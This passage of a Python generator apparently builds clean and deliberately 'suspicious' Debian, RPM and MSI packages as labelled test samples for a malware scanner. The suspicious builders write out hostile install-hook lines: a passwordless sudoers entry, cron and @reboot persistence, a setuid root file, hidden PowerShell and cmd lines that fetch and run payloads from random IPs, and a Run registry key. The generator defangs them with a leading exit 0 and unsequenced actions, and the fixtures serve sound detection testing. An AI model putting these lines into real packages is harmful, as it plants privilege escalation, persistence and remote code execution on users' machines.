        for k, (v, mode) in data_files.items():
            fp = root / k; fp.parent.mkdir(parents=True, exist_ok=True); fp.write_text(v); os.chmod(fp, mode)
        subprocess.run(["dpkg-deb", "--root-owner-group", "-Zgzip", "--build", str(root), str(path)], check=True, capture_output=True)

def deb_clean(d):
    pkg = f"fg-{w()}"; v = ver(); p = d / f"{pkg}_{v}_all.deb"
    deb_build(p, pkg, v, "#!/bin/sh\nset -e\nif [ \"$1\" = configure ]; then\n  echo \"configured\"\nfi\nexit 0\n",
              {f"usr/bin/{pkg}": ("#!/bin/sh\necho hello\n", 0o755), f"usr/share/doc/{pkg}/README": ("hello tool\n", 0o644)})
    record(p, "debian_deb", "clean", [], "postinst 只 echo")

def deb_susp(d):
    pkg = f"fg-{w()}"; v = ver(); lines, data, planted = [], {f"usr/bin/{pkg}": ("#!/bin/sh\necho hi\n", 0o755)}, []
    for c in pick(["curl_pipe", "reverse_shell", "authorized_keys", "sudoers_d", "disable_sec", "ld_preload", "cron_drop"]):
        if c == "sudoers_d": lines.append(f"echo '{pkg} ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/{pkg}"); planted.append(dict(id=c, sev="high", desc="postinst 写 /etc/sudoers.d/ 提权"))
        elif c == "cron_drop":
            data[f"etc/cron.d/{pkg}"] = (f"*/10 * * * * root curl -s http://{ip()}/hb >/dev/null\n", 0o644)
            lines.append(f"(crontab -l 2>/dev/null; echo '@reboot /usr/bin/{pkg}') | crontab -"); planted.append(dict(id=c, sev="low", desc="安装 /etc/cron.d 定时任务 + crontab 持久化"))
        else:
            sev, desc, line = shb(c); lines.append(line); planted.append(dict(id=c, sev=sev, desc="postinst " + desc, code=SH_CODES.get(c)))
    p = d / f"{pkg}_{v}_all.deb"
    deb_build(p, pkg, v, f"#!/bin/sh\n# {INERT}\nexit 0\n" + "\n".join(lines) + "\n", data)
    record(p, "debian_deb", "suspicious", planted, "postinst 首行 exit 0；postinst 是安装钩子，命中高危 YARA 时引擎会升级为严重")

# ===================================================================== 18. RPM
def rpm_build(path_dir, name, version, post, files_attr, extra_files):
    with tempfile.TemporaryDirectory() as t:
        top = Path(t)
        for s in ("BUILD", "RPMS", "SOURCES", "SPECS", "SRPMS", "BUILDROOT"): (top / s).mkdir()
        install = "\n".join(f"mkdir -p %{{buildroot}}$(dirname {k})\ncat > %{{buildroot}}{k} <<'FGEOF'\n{v}FGEOF" for k, v in extra_files.items())
        spec = f"Name: {name}\nVersion: {version}\nRelease: 1\nSummary: {w()} helper\nLicense: MIT\nBuildArch: noarch\n%description\n{INERT}\n%install\n{install}\n%files\n" + "\n".join(files_attr) + "\n"
        if post: spec += f"%post\n{post}\n"
        (top / "SPECS/x.spec").write_text(spec)
        subprocess.run(["rpmbuild", "--define", f"_topdir {top}", "--define", "_build_id_links none", "-bb", str(top / "SPECS/x.spec")], check=True, capture_output=True)
        out = next((top / "RPMS/noarch").glob("*.rpm")); dest = Path(path_dir) / out.name; shutil.copy(out, dest); return dest

def rpm_clean(d):
    name = f"fg-{w()}"
    p = rpm_build(d, name, ver(), "", [f"%attr(0755,root,root) /usr/bin/{name}"], {f"/usr/bin/{name}": "#!/bin/sh\necho hello\n"})
    record(p, "rpm", "clean", [], "无 scriptlet")

def rpm_susp(d):
    name = f"fg-{w()}"; lines, planted = [], []; attrs = [f"%attr(0755,root,root) /usr/bin/{name}"]
    for c in pick(["curl_pipe", "reverse_shell", "authorized_keys", "setuid", "disable_sec", "history_wipe", "nc_shell"]):
        if c == "setuid": attrs = [f"%attr(4755,root,root) /usr/bin/{name}"]; planted.append(dict(id=c, sev="medium", code="setuid", desc="安装 setuid root 文件（内容只是 echo）"))
        else:
            sev, desc, line = shb(c); lines.append(line); planted.append(dict(id=c, sev=sev, desc="%post " + desc, code=SH_CODES.get(c)))
    post = (f"# {INERT}\nexit 0\n" + "\n".join(lines)) if lines else ""
    p = rpm_build(d, name, ver(), post, attrs, {f"/usr/bin/{name}": "#!/bin/sh\necho hi\n"}); record(p, "rpm", "suspicious", planted, "%post 首行 exit 0")

# ===================================================================== 19. MSI
def msi_build(path, props, cas=(), regs=()):
    import uuid
    subprocess.run(["msibuild", str(path), "-s", f"{w().title()} Setup", f"{w().title()} Corp", "Intel;1033", "{%s}" % str(uuid.uuid4()).upper()], check=True, capture_output=True)
    cmd = ["msibuild", str(path), "-q", "CREATE TABLE `Property` (`Property` CHAR(72) NOT NULL, `Value` LONGCHAR NOT NULL PRIMARY KEY `Property`)"]
    for k, v in props.items(): cmd += ["-q", f"INSERT INTO `Property` (`Property`,`Value`) VALUES ('{k}','{v}')"]
    if cas:
        cmd += ["-q", "CREATE TABLE `CustomAction` (`Action` CHAR(72) NOT NULL, `Type` SHORT NOT NULL, `Source` CHAR(72), `Target` CHAR(255) PRIMARY KEY `Action`)"]
        for a, t, s, tg in cas: cmd += ["-q", f"INSERT INTO `CustomAction` (`Action`,`Type`,`Source`,`Target`) VALUES ('{a}',{t},'{s}','{tg}')"]
    if regs:
        cmd += ["-q", "CREATE TABLE `Registry` (`Registry` CHAR(72) NOT NULL, `Root` SHORT NOT NULL, `Key` CHAR(255) NOT NULL, `Name` CHAR(255), `Value` LONGCHAR, `Component_` CHAR(72) NOT NULL PRIMARY KEY `Registry`)"]
        for r_, root, key, nm, val in regs: cmd += ["-q", f"INSERT INTO `Registry` (`Registry`,`Root`,`Key`,`Name`,`Value`,`Component_`) VALUES ('{r_}',{root},'{key}','{nm}','{val}','Main')"]
    subprocess.run(cmd, check=True, capture_output=True)

def msi_clean(d):
    prod = f"{w().title()}{w().title()}"; p = d / f"{prod}-{ver()}.msi"
    msi_build(p, {"ProductName": prod, "ProductVersion": "1.0.0", "Manufacturer": f"{w().title()} Ltd"}, regs=[("Reg1", 1, f"Software\\{prod}", "InstallDir", "[INSTALLDIR]")])
    record(p, "msi_installer", "clean", [], "只有 Property/Registry 表，不可安装")

def msi_susp(d):
    cas, regs, planted = [], [], []
    for c in pick(["ca_powershell", "ca_vbscript", "ca_cmd_http", "run_key"]):
        i = ip()
        if c == "ca_powershell": cas.append((f"Ps{w().title()}", 34, "INSTALLDIR", f"powershell.exe -w hidden -c iwr http://{i}/a.ps1|iex")); planted.append(dict(id=c, sev="medium", code="ca", desc="CustomAction(EXE, type 34) 运行隐藏 PowerShell"))
        elif c == "ca_vbscript": cas.append((f"Vbs{w().title()}", 38, "", 'CreateObject("WScript.Shell").Run "cmd /c echo inert", 0')); planted.append(dict(id=c, sev="medium", code="ca", desc="CustomAction(VBScript, type 38) 内联脚本"))
        elif c == "ca_cmd_http": cas.append((f"Cmd{w().title()}", 50, "", f"cmd.exe /c curl http://{i}/p.exe -o %TEMP%\\p.exe")); planted.append(dict(id=c, sev="medium", code="ca", desc="CustomAction(EXE, type 50) cmd 下载"))
        elif c == "run_key": regs.append(("RunKey", 1, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", w(), "[INSTALLDIR]svc.exe")); planted.append(dict(id=c, sev="medium", code="autorun", desc="Registry 表写 CurrentVersion\\Run 自启动"))
    prod = f"{w().title()}Updater"; p = d / f"{prod}-{ver()}.msi"
    msi_build(p, {"ProductName": prod, "ProductVersion": "2.0.0", "Manufacturer": "Unknown"}, cas, regs)
    record(p, "msi_installer", "suspicious", planted, "CustomAction 未排入任何执行序列，永不运行。注意疑似引擎 bug：msi_checks 用 ca[3:] 丢掉前 3 条 CustomAction（msiinfo export 的表头行本就不匹配正则），因此 ≤3 条 CustomAction 时可能全部漏报（预期结论里的 CustomAction 中危实际可能不出现）")

SCENARIOS = [
    ("01_npm_tarball", npm_clean, npm_susp), ("02_pypi_sdist", sdist_clean, sdist_susp), ("03_pypi_wheel", whl_clean, whl_susp),
    ("04_javascript", js_clean, js_susp), ("05_python_script", py_clean, py_susp), ("06_shell_script", sh_clean, sh_susp),
    ("07_powershell", ps_clean, ps_susp), ("08_batch", bat_clean, bat_susp), ("09_vbscript", vbs_clean, vbs_susp), ("10_php", php_clean, php_susp),
    ("11_office_ooxml", office_clean, office_susp), ("12_pdf", pdf_clean, pdf_susp), ("13_zip_archive", zip_clean, zip_susp),
    ("14_nested_archive", nested_clean, nested_susp), ("15_pe_windows", pe_clean, pe_susp), ("16_elf_linux", elf_clean, elf_susp),
    ("17_debian_deb", deb_clean, deb_susp), ("18_rpm", rpm_clean, rpm_susp), ("19_msi_installer", msi_clean, msi_susp),
]

if __name__ == "__main__":
    for name, fc, fs in SCENARIOS:
        d = scen_dir(name); (d / "clean").mkdir(exist_ok=True); (d / "suspicious").mkdir(exist_ok=True)
        fc(d / "clean")
        for _try in range(20):   # re-roll if every planted behaviour is only low severity (keep "suspicious" meaningful)
            fs(d / "suspicious")
            if any(x["severity_expected"] != "low" for x in MANIFEST[-1]["planted"]): break
            (OUT / MANIFEST.pop()["path"]).unlink()
    json.dump({"generated_at": time.strftime("%Y-%m-%d %H:%M %Z"), "seed": SEED, "generator": "tests/samples/_generator/gen.py",
               "safety": INERT, "samples": MANIFEST}, open(OUT / "manifest.json", "w"), ensure_ascii=False, indent=2)
    print(OUT)
